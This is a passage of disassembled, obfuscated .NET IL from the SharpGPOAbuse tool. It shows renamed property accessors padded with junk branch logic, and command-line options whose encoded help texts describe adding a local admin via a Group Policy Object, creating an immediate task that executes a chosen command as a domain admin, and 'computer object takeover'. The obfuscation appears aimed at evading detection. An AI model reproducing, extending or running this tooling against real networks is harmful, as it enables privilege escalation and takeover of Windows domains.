    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x6305e15c
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::StoreAssemblyEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::CMS_ASSEMBLY_REFERENCE_DEPENDENT_ASSEMBLY_FLAG

  .method public hidebysig specialname instance void 
          CMS_ENTRY_POINT_FLAG(string CMS_USAGE_PATTERN) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::StoreAssemblyEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::CMS_ENTRY_POINT_FLAG

  .method public hidebysig specialname instance string 
          CMS_SCHEMA_VERSION() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x4294a025
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x1cc2cfd3
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_ASSEMBLY_FILE
    IL_0024:  ret
  } // end of method TimerCallback::CMS_SCHEMA_VERSION

  .method public hidebysig specialname instance void 
          CMS_TIME_UNIT_TYPE(string CMS_HASH_TRANSFORM) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_ASSEMBLY_FILE
    IL_0007:  ret
  } // end of method TimerCallback::CMS_TIME_UNIT_TYPE

  .method public hidebysig specialname instance string 
          CMS_HASH_DIGESTMETHOD() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x50e9e6b
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x59e1e42b
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::StoreAssemblyFileEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::CMS_HASH_DIGESTMETHOD

  .method public hidebysig specialname instance void 
          MuiResourceIdLookupMapEntry(string IMuiResourceIdLookupMapEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::StoreAssemblyFileEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::MuiResourceIdLookupMapEntry

  .method public hidebysig specialname instance string 
          MuiResourceTypeIdStringEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x2a6a7a03
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x72f84aeb
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY
    IL_0024:  ret
  } // end of method TimerCallback::MuiResourceTypeIdStringEntry

  .method public hidebysig specialname instance void 
          IMuiResourceTypeIdStringEntry(string MuiResourceTypeIdIntEntryFieldId) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY
    IL_0007:  ret
  } // end of method TimerCallback::IMuiResourceTypeIdStringEntry

  .method public hidebysig specialname instance string 
          IMuiResourceTypeIdIntEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x73803693
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x75df7eee
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::StoreCategoryEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::IMuiResourceTypeIdIntEntry

  .method public hidebysig specialname instance void 
          MuiResourceMapEntryFieldId(string HashElementEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::StoreCategoryEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::MuiResourceMapEntryFieldId

  .method public hidebysig specialname instance bool 
          HashElementEntryFieldId() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x5d61d273
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x3a14115
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY_SUBCATEGORY
    IL_0024:  ret
  } // end of method TimerCallback::HashElementEntryFieldId

  .method public hidebysig specialname instance void 
          FileEntry(bool IFileEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY_SUBCATEGORY
    IL_0007:  ret
  } // end of method TimerCallback::FileEntry

  .method public hidebysig specialname instance bool 
          FileAssociationEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x1dea892a
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x7078e9f7
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::StoreSubcategoryEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::FileAssociationEntry

  .method public hidebysig specialname instance void 
          IFileAssociationEntry(bool CategoryMembershipDataEntryFieldId) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::StoreSubcategoryEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::IFileAssociationEntry

  .method public hidebysig specialname instance bool 
          ICategoryMembershipDataEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x10317b64
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x7dafbcf6
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY_INSTANCE
    IL_0024:  ret
  } // end of method TimerCallback::ICategoryMembershipDataEntry

  .method public hidebysig specialname instance void 
          SubcategoryMembershipEntryFieldId(bool CategoryMembershipEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IEnumSTORE_CATEGORY_INSTANCE
    IL_0007:  ret
  } // end of method TimerCallback::SubcategoryMembershipEntryFieldId

  .method public hidebysig specialname instance bool 
          CategoryMembershipEntryFieldId() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x2165dffd
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x1054cfbc
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::StoreCategoryInstanceEnumeration
    IL_0024:  ret
  } // end of method TimerCallback::CategoryMembershipEntryFieldId

  .method public hidebysig specialname instance void 
          COMServerEntry(bool ICOMServerEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::StoreCategoryInstanceEnumeration
    IL_0007:  ret
  } // end of method TimerCallback::COMServerEntry

  .method public hidebysig specialname instance string 
          ProgIdRedirectionEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x572834c0
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x65e13fab
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IReferenceIdentity
    IL_0024:  ret
  } // end of method TimerCallback::ProgIdRedirectionEntry

  .method public hidebysig specialname instance void 
          IProgIdRedirectionEntry(string CLRSurrogateEntryFieldId) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IReferenceIdentity
    IL_0007:  ret
  } // end of method TimerCallback::IProgIdRedirectionEntry

  .method public hidebysig specialname instance bool 
          ICLRSurrogateEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x328cc59c
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x7e551542
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IDefinitionIdentity
    IL_0024:  ret
  } // end of method TimerCallback::ICLRSurrogateEntry

  .method public hidebysig specialname instance void 
          AssemblyReferenceDependentAssemblyEntryFieldId(bool AssemblyReferenceEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IDefinitionIdentity
    IL_0007:  ret
  } // end of method TimerCallback::AssemblyReferenceDependentAssemblyEntryFieldId

  .method public hidebysig specialname instance bool 
          AssemblyReferenceEntryFieldId() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x736faeea
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x20ca2257
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IEnumIDENTITY_ATTRIBUTE
    IL_0024:  ret
  } // end of method TimerCallback::AssemblyReferenceEntryFieldId

  .method public hidebysig specialname instance void 
          WindowClassEntry(bool IWindowClassEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IEnumIDENTITY_ATTRIBUTE
    IL_0007:  ret
  } // end of method TimerCallback::WindowClassEntry

  .method public hidebysig specialname instance bool 
          ResourceTableMappingEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x6db5a436
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x3a3c214
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IEnumDefinitionIdentity
    IL_0024:  ret
  } // end of method TimerCallback::ResourceTableMappingEntry

  .method public hidebysig specialname instance void 
          IResourceTableMappingEntry(bool EntryPointEntryFieldId) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IEnumDefinitionIdentity
    IL_0007:  ret
  } // end of method TimerCallback::IResourceTableMappingEntry

  .method public hidebysig specialname instance string 
          IEntryPointEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x5b19cabc
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x7fcdb325
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IEnumReferenceIdentity
    IL_0024:  ret
  } // end of method TimerCallback::IEntryPointEntry

  .method public hidebysig specialname instance void 
          PermissionSetEntryFieldId(string AssemblyRequestEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IEnumReferenceIdentity
    IL_0007:  ret
  } // end of method TimerCallback::PermissionSetEntryFieldId

  .method public hidebysig specialname instance string 
          AssemblyRequestEntryFieldId() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x12caf746
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x2ef9bdc1
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      string SharpGPOAbuse.TimerCallback::IDefinitionAppId
    IL_0024:  ret
  } // end of method TimerCallback::AssemblyRequestEntryFieldId

  .method public hidebysig specialname instance void 
          DescriptionMetadataEntry(string IDescriptionMetadataEntry) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string SharpGPOAbuse.TimerCallback::IDefinitionAppId
    IL_0007:  ret
  } // end of method TimerCallback::DescriptionMetadataEntry

  .method public hidebysig specialname instance bool 
          DeploymentMetadataEntry() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x7552607
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0xea05292
    IL_000c:  beq        IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  ldfld      bool SharpGPOAbuse.TimerCallback::IReferenceAppId
    IL_0024:  ret
  } // end of method TimerCallback::DeploymentMetadataEntry

  .method public hidebysig specialname instance void 
          IDeploymentMetadataEntry(bool DependentOSMetadataEntryFieldId) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool SharpGPOAbuse.TimerCallback::IReferenceAppId
    IL_0007:  ret
  } // end of method TimerCallback::IDeploymentMetadataEntry

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x52719422
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x7964f373
    IL_000c:  bne.un     IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0024:  ret
  } // end of method TimerCallback::.ctor

  .property instance string MetadataSectionEntry()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 10 44 6F 6D 61 69 6E 43 6F 6E 74 72 6F   // ....DomainContro
                                                                         6C 6C 65 72 02 00 54 02 08 52 65 71 75 69 72 65   // ller..T..Require
                                                                         64 00 54 0E 08 48 65 6C 70 54 65 78 74 21 53 65   // d.T..HelpText!Se
                                                                         74 20 74 68 65 20 64 6F 6D 61 69 6E 20 63 6F 6E   // t the domain con
                                                                         74 72 6F 6C 6C 65 72 20 74 6F 20 75 73 65 2E )    // troller to use.
    .get instance string SharpGPOAbuse.TimerCallback::TimerBase()
    .set instance void SharpGPOAbuse.TimerCallback::WaitHandleCannotBeOpenedException(string)
  } // end of property TimerCallback::MetadataSectionEntry
  .property instance string MetadataSectionEntryFieldId()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 06 44 6F 6D 61 69 6E 02 00 54 02 08 52   // ....Domain..T..R
                                                                         65 71 75 69 72 65 64 00 54 0E 08 48 65 6C 70 54   // equired.T..HelpT
                                                                         65 78 74 16 53 65 74 20 74 68 65 20 74 61 72 67   // ext.Set the targ
                                                                         65 74 20 64 6F 6D 61 69 6E 2E )                   // et domain.
    .get instance string SharpGPOAbuse.TimerCallback::MTAThreadAttribute()
    .set instance void SharpGPOAbuse.TimerCallback::ISectionWithStringKey(string)
  } // end of property TimerCallback::MetadataSectionEntryFieldId
  .property instance string IMetadataSectionEntry()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0B 55 73 65 72 41 63 63 6F 75 6E 74 02   // ....UserAccount.
                                                                         00 54 02 08 52 65 71 75 69 72 65 64 00 54 0E 08   // .T..Required.T..
                                                                         48 65 6C 70 54 65 78 74 27 55 73 65 72 20 74 6F   // HelpText'User to
                                                                         20 73 65 74 20 61 73 20 6C 6F 63 61 6C 20 61 64   //  set as local ad
                                                                         6D 69 6E 20 76 69 61 20 74 68 65 20 47 50 4F 2E ) // min via the GPO.
    .get instance string SharpGPOAbuse.TimerCallback::IEnumUnknown()
    .set instance void SharpGPOAbuse.TimerCallback::CMSSECTIONID(string)
  } // end of property TimerCallback::IMetadataSectionEntry
  .property instance string CmsUtils()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 07 47 70 6F 4E 61 6D 65 02 00 54 02 08   // ....GpoName..T..
                                                                         52 65 71 75 69 72 65 64 00 54 0E 08 48 65 6C 70   // Required.T..Help
                                                                         54 65 78 74 3A 47 50 4F 20 74 6F 20 62 65 20 65   // Text:GPO to be e
                                                                         64 69 74 65 64 2E 20 4E 65 65 64 20 74 6F 20 68   // dited. Need to h
                                                                         61 76 65 20 65 64 69 74 20 70 65 72 6D 69 73 73   // ave edit permiss
                                                                         69 6F 6E 20 6F 6E 20 74 68 65 20 47 50 4F 2E )    // ion on the GPO.
    .get instance string SharpGPOAbuse.TimerCallback::CMS_ASSEMBLY_REFERENCE_DEPENDENT_ASSEMBLY_FLAG()
    .set instance void SharpGPOAbuse.TimerCallback::CMS_ENTRY_POINT_FLAG(string)
  } // end of property TimerCallback::CmsUtils
  .property instance string BLOB()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 08 54 61 73 6B 4E 61 6D 65 02 00 54 02   // ....TaskName..T.
                                                                         08 52 65 71 75 69 72 65 64 00 54 0E 08 48 65 6C   // .Required.T..Hel
                                                                         70 54 65 78 74 23 54 68 65 20 6E 61 6D 65 20 6F   // pText#The name o
                                                                         66 20 74 68 65 20 6E 65 77 20 69 6D 6D 65 64 69   // f the new immedi
                                                                         61 74 65 20 74 61 73 6B 2E )                      // ate task.
    .get instance string SharpGPOAbuse.TimerCallback::CMS_SCHEMA_VERSION()
    .set instance void SharpGPOAbuse.TimerCallback::CMS_TIME_UNIT_TYPE(string)
  } // end of property TimerCallback::BLOB
  .property instance string IDENTITY_ATTRIBUTE()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 06 41 75 74 68 6F 72 02 00 54 02 08 52   // ....Author..T..R
                                                                         65 71 75 69 72 65 64 00 54 0E 08 48 65 6C 70 54   // equired.T..HelpT
                                                                         65 78 74 39 54 68 65 20 61 75 74 68 6F 72 20 6F   // ext9The author o
                                                                         66 20 74 68 65 20 6E 65 77 20 69 6D 6D 65 64 69   // f the new immedi
                                                                         61 74 65 20 74 61 73 6B 2E 20 55 73 65 20 61 20   // ate task. Use a 
                                                                         64 6F 6D 61 69 6E 20 61 64 6D 69 6E 2E )          // domain admin.
    .get instance string SharpGPOAbuse.TimerCallback::CMS_HASH_DIGESTMETHOD()
    .set instance void SharpGPOAbuse.TimerCallback::MuiResourceIdLookupMapEntry(string)
  } // end of property TimerCallback::IDENTITY_ATTRIBUTE
  .property instance string STORE_ASSEMBLY_STATUS_FLAGS()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 07 43 6F 6D 6D 61 6E 64 02 00 54 02 08   // ....Command..T..
                                                                         52 65 71 75 69 72 65 64 00 54 0E 08 48 65 6C 70   // Required.T..Help
                                                                         54 65 78 74 2A 43 6F 6D 6D 61 6E 64 20 74 6F 20   // Text*Command to 
                                                                         65 78 65 63 75 74 65 20 76 69 61 20 74 68 65 20   // execute via the 
                                                                         69 6D 6D 65 64 69 61 74 65 20 74 61 73 6B 2E )    // immediate task.
    .get instance string SharpGPOAbuse.TimerCallback::MuiResourceTypeIdStringEntry()
    .set instance void SharpGPOAbuse.TimerCallback::IMuiResourceTypeIdStringEntry(string)
  } // end of property TimerCallback::STORE_ASSEMBLY_STATUS_FLAGS
  .property instance string STORE_ASSEMBLY()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 09 41 72 67 75 6D 65 6E 74 73 02 00 54   // ....Arguments..T
                                                                         02 08 52 65 71 75 69 72 65 64 00 54 0E 08 48 65   // ..Required.T..He
                                                                         6C 70 54 65 78 74 28 43 6F 6D 6D 61 6E 64 20 61   // lpText(Command a
                                                                         72 67 75 6D 65 6E 74 73 20 6F 66 20 74 68 65 20   // rguments of the 
                                                                         69 6D 6D 65 64 69 61 74 65 20 74 61 73 6B 2E )    // immediate task.
    .get instance string SharpGPOAbuse.TimerCallback::IMuiResourceTypeIdIntEntry()
    .set instance void SharpGPOAbuse.TimerCallback::MuiResourceMapEntryFieldId(string)
  } // end of property TimerCallback::STORE_ASSEMBLY
  .property instance bool STORE_ASSEMBLY_FILE_STATUS_FLAGS()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0D 41 64 64 4C 6F 63 61 6C 41 64 6D 69   // ....AddLocalAdmi
                                                                         6E 02 00 54 02 08 52 65 71 75 69 72 65 64 00 54   // n..T..Required.T
                                                                         0E 08 48 65 6C 70 54 65 78 74 14 41 64 64 20 6E   // ..HelpText.Add n
                                                                         65 77 20 6C 6F 63 61 6C 20 61 64 6D 69 6E 2E )    // ew local admin.
    .get instance bool SharpGPOAbuse.TimerCallback::HashElementEntryFieldId()
    .set instance void SharpGPOAbuse.TimerCallback::FileEntry(bool)
  } // end of property TimerCallback::STORE_ASSEMBLY_FILE_STATUS_FLAGS
  .property instance bool STORE_ASSEMBLY_FILE()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0F 41 64 64 43 6F 6D 70 75 74 65 72 54   // ....AddComputerT
                                                                         61 73 6B 02 00 54 02 08 52 65 71 75 69 72 65 64   // ask..T..Required
                                                                         00 54 0E 08 48 65 6C 70 54 65 78 74 36 41 64 64   // .T..HelpText6Add
                                                                         20 61 20 6E 65 77 20 69 6D 6D 65 64 69 61 74 65   //  a new immediate
                                                                         20 74 61 73 6B 20 66 6F 72 20 63 6F 6D 70 75 74   //  task for comput
                                                                         65 72 20 6F 62 6A 65 63 74 20 74 61 6B 65 6F 76   // er object takeov
                                                                         65 72 2E )                                        // er.
    .get instance bool SharpGPOAbuse.TimerCallback::FileAssociationEntry()
    .set instance void SharpGPOAbuse.TimerCallback::IFileAssociationEntry(bool)
  } // end of property TimerCallback::STORE_ASSEMBLY_FILE
